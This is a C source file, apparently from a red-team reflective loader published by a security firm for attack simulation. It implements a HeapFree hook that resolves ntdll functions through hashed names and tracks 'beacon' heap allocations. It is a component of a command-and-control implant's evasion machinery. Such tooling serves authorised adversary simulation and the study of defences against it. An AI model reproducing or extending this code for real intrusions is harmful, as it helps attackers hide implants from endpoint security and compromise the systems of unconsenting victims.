/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Free's a block of memory, and removes it from
 * the list of valid allocations.
 *
!*/
D_SEC( D ) BOOL WINAPI HeapFree_Hook( _In_ HANDLE ProcessHeap, _In_ ULONG Flags, _In_ PVOID lpMem )
{
	API			Api;

	BOOL			Ret = FALSE;
	PTABLE			Tbl = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PHEAP_ENTRY_BEACON	Heb = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Api.RtlFreeHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Get table header and entry(s) */
	Tbl = C_PTR( *( PVOID * )( G_SYM( Table ) ) );

	/* Lock Heap Access */
	LockAccess( &Tbl->HeapListLock );

	Hdr = C_PTR( & Tbl->HeapList );
	Ent = C_PTR( Hdr->Flink );

	/* Enumerate the complete list of entries */
	for ( ; Ent != Hdr ; Ent = C_PTR( Ent->Flink ) ) {
		/* Pointer to the structure */
		Heb = C_PTR( CONTAINING_RECORD( Ent, HEAP_ENTRY_BEACON, HeapList ) );

		/* Is this our buffer address */
		if ( Heb->Buffer == C_PTR( lpMem ) ) {
			/* Free the original buffer */
			if ( ( Ret = Api.RtlFreeHeap( ProcessHeap, Flags, Heb->Buffer ) ) != FALSE ) {
				/* Remove from list */
				RemoveEntryList( &Heb->HeapList );
				Heb->Length = 0;
				Heb->Buffer = NULL;
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Heb );
			};
			/* Abort! */
			break;
		};
	};

	/* Unlock Heap Access */
	UnlockAccess( &Tbl->HeapListLock );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Return */
	return Ret;
};
